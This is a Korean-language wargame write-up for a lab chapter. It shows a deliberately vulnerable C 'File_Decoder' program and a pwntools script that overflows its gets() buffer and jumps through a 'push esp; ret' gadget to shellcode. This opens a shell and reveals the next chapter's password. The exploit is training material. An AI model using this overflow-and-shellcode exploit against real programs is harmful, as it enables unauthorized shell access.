https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter02/ch2.c
```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

int cmp = 0xfffff, num = 0;
char srl[30] = "3t267s77wh2djfi3mid2od2o329dw";

void dec(char * ptr, int len)
{
    for(int i = 0; i < len; i++){
        ptr[i] ^= 0x40;       
    }
}

void print_file()
{
    FILE * fp;
    int flsz = 0;
    char * file = 0;

    printf("Wait until decode\n");

    sleep(3);

    fp = fopen(".Real_Top_Secret", "rb");

    fseek(fp, 0, SEEK_END);
    flsz = ftell(fp);
    rewind(fp);

    file = malloc(sizeof(char)*flsz+1);
    memset(file, 0, flsz+1);

    fread(file, flsz, 1, fp);

    dec(file, flsz);

    system("clear");

    printf("--------------------------------------------------------------------------\n");
    printf("%s\n", file);
    printf("--------------------------------------------------------------------------\n");

    fclose(fp);
    free(file);
    file = NULL;

    if(getchar() != 0){
        system("clear");
    }

    free(file);
    file = NULL;
}


int main()
{
    char serial[256] = {0, };

    printf("Serial Number: ");
    gets(serial);

    if(strlen(serial) == 29){
        cmp = strcmp(serial, srl);
        if(cmp == 0){
            printf("Welcome Back!\n");
            print_file();
            goto end;
        }
    }

    end:
    return 0;
}
```

srl을 코드에서 알려주고, ``gets()``로 사용자에게 Serial Number를 입력받는다.  
사용자 입력값과 srl이 같은지 검증하고, 만약 같다면 ``print_file()`` 함수를 호출한다.  
그러나 ``print_file()`` 함수를 통해 확인할 수 있는 .Real_Top_Secret에는 Chapter 3의 Credential에 관한 정보가 포함되어 있지 않다.  
바이너리는 Chapter 3의 사용자가 Owner로 등록되어 있기 때문에 Shell을 획득하고, status 명령어로 PW를 획득할 수 있다.  

ROPgadget으로 ``0x0804918b : push esp ; mov ebx, dword ptr [esp] ; ret`` 가젯을 찾았다.  
이를 이용하면 esp를 리턴 주소에 넣어서 쉘코드를 트리거시킬 수 있을 것이다.  

익스플로잇 흐름은 다음과 같다.
```
# expl.py
from pwn import *
context.arch = "i386"

p = process('./File_Decoder')

push_esp_ret = 0x0804918b

shellcode = asm(shellcraft.sh())

payload = b'A' * 0x108
payload += b'B' * 0x4           # Overwrite EBP
payload += p32(push_esp_ret)
payload += shellcode

p.sendline(payload)

p.interactive()
```
성공적으로 쉘코드를 트리거하였고, status 명령어를 통해 Chapter 3 유저의 PW를 확인할 수 있다.  
```
Decoding_for_Escape@hsapce-io:~$ python3 expl.py
[+] Starting local process './File_Decoder': pid 3262
[*] Switching to interactive mode
$ status
UID: 503
Chapter3 PW: Escape_Triggered_by_shellcode
■■■■■■■■■■
$
```
